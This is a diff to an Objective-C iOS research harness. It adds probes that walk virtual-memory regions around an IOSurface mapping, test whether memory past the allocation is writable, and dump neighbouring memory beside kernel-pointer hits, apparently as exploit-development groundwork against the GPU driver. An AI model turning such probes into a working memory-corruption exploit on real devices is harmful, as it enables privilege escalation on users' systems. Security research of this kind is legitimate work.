@@ -47,6 +47,9 @@
 #import <sys/wait.h>
 #import <unistd.h>
 #import <errno.h>
+#import <mach/mach.h>
+#import <mach/mach_vm.h>
+#import <mach/vm_region.h>
 
 extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
     mach_vm_address_t address, mach_vm_size_t size,
@@ -235,6 +238,18 @@ static void mem_probe_surface(IOSurfaceRef srf, const char *tag, uint64_t limit)
             if (hits < 12) {
                 L(@"[MX] %s KP +0x%llx = 0x%016llx", tag,
                   (unsigned long long)off, (unsigned long long)w);
+            }
+            if (hits < 2) {
+                uint64_t s0 = off & ~0xfULL;
+                for (int d = -4; d <= 4; d++) {
+                    int64_t o = (int64_t)s0 + (int64_t)d * 16;
+                    if (o < 0) continue;
+                    if (!probe_range(base, (uint64_t)o, 16)) continue;
+                    L(@"[MX] %s   ctx +0x%llx: %016llx %016llx", tag,
+                      (unsigned long long)o,
+                      (unsigned long long)rd64(base + (uint64_t)o),
+                      (unsigned long long)rd64(base + (uint64_t)o + 8));
+                }
             }
             hits++;
         }
@@ -657,6 +672,101 @@ static void metal_cross_object_write(IOSurfaceRef surf, uint64_t agx_va, uint64_
     L(@"[METAL] done");
 }
 
+// ---- virtual-memory region probe ----
+// The userspace mapping of an IOSurface can look like it runs past its
+// allocation: the byte walk keeps succeeding because the next virtual mapping
+// starts exactly where this one ends. mach_vm_region says which of the two it
+// is, and whether the bytes past alloc belong to this surface or a neighbour.
+
+static void va_probe(IOSurfaceRef srf, const char *tag, uint64_t limit) {
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(srf);
+    if (!base) { L(@"[VA] %s no base", tag); return; }
+    uint64_t addr = (uint64_t)base;
+    uint64_t alloc = (uint64_t)IOSurfaceGetAllocSize(srf);
+    L(@"[VA] %s base=0x%llx alloc=0x%llx", tag, (unsigned long long)addr,
+      (unsigned long long)alloc);
+
+    uint64_t cur = addr;
+    uint64_t end = addr + limit;
+    for (int n = 0; n < 16 && cur < end; n++) {
+        mach_vm_address_t region = cur;
+        mach_vm_size_t size = 0;
+        natural_t depth = 0;
+        vm_region_submap_info_data_64_t info;
+        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
+        kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &region, &size,
+                                                  &depth,
+                                                  (vm_region_recurse_info_t)&info,
+                                                  &count);
+        if (kr != KERN_SUCCESS) {
+            L(@"[VA] %s walk stopped kr=0x%x at=0x%llx", tag, kr,
+              (unsigned long long)cur);
+            break;
+        }
+        L(@"[VA] %s r%d start=0x%llx size=0x%llx prot=%d/%d tag=%d",
+          tag, n, (unsigned long long)region, (unsigned long long)size,
+          info.protection, info.max_protection, info.user_tag);
+        if (size == 0) break;
+        cur = region + size;
+    }
+    L(@"[VA] %s walkEnd at=0x%llx", tag, (unsigned long long)cur);
+}
+
+static void va_write_test(IOSurfaceRef srf, const char *tag, uint64_t off) {
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(srf);
+    if (!base) { L(@"[VA] %s no base", tag); return; }
+    if (!probe_range(base, off, 4)) {
+        L(@"[VA] %s +0x%llx unreadable", tag, (unsigned long long)off);
+        return;
+    }
+    uint32_t old = 0, back = 0;
+    uint32_t canary = 0x5a5a0000u | (uint32_t)(off & 0xffff);
+    memcpy(&old, base + off, 4);
+    memcpy(base + off, &canary, 4);
+    memcpy(&back, base + off, 4);
+    memcpy(base + off, &old, 4);
+    L(@"[VA] %s +0x%llx old=0x%08x put=0x%08x back=0x%08x %s", tag,
+      (unsigned long long)off, old, canary, back,
+      back == canary ? "WRITABLE" : "read-only");
+}
+
+static void va_dump(IOSurfaceRef srf, const char *tag, uint64_t off, int words) {
+    uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(srf);
+    if (!base) { L(@"[VA] %s no base", tag); return; }
+    for (int i = 0; i < words; i += 2) {
+        uint64_t o = off + (uint64_t)i * 8;
+        if (!probe_range(base, o, 16)) break;
+        L(@"[VA] %s +0x%llx: %016llx %016llx", tag, (unsigned long long)o,
+          (unsigned long long)rd64(base + o),
+          (unsigned long long)rd64(base + o + 8));
+    }
+}
+
+static void va_section(IOSurfaceRef f1) {
+    L(@"[VA] === region probe ===");
+    if (probe_install() != 0) { L(@"[VA] sigaction failed"); return; }
+
+    va_probe(f1, "F1", 0x400000ULL);
+    va_write_test(f1, "F1", 0x10000ULL);
+    va_write_test(f1, "F1", 0x20000ULL);
+    va_dump(f1, "F1", 0x10000ULL, 16);
+
+    NSDictionary *d = @{
+        (id)kIOSurfaceWidth: @64,
+        (id)kIOSurfaceHeight: @64,
+        (id)kIOSurfaceBytesPerElement: @4,
+        (id)kIOSurfacePixelFormat: @0x42475241
+    };
+    IOSurfaceRef ctl = IOSurfaceCreate((__bridge CFDictionaryRef)d);
+    if (ctl) {
+        va_probe(ctl, "CTRL", 0x100000ULL);
+        va_write_test(ctl, "CTRL", 0x4000ULL);
+        va_write_test(ctl, "CTRL", 0x8000ULL);
+        CFRelease(ctl);
+    }
+    L(@"[VA] === region probe done ===");
+}
+
 // ---- resume-driven geometry sweep ----
 // fork() is refused inside the app sandbox (EPERM, errno 1), so the points run
 // inline. Progress lives on disk: the index is written *before* a point runs, so
@@ -863,6 +973,8 @@ static void run(void) {
     metal_cross_object_write(surf, agx_va, agx_span);
 
     mapping_probe(surf);
+
+    va_section(surf);
 
     gd_sweep();
 
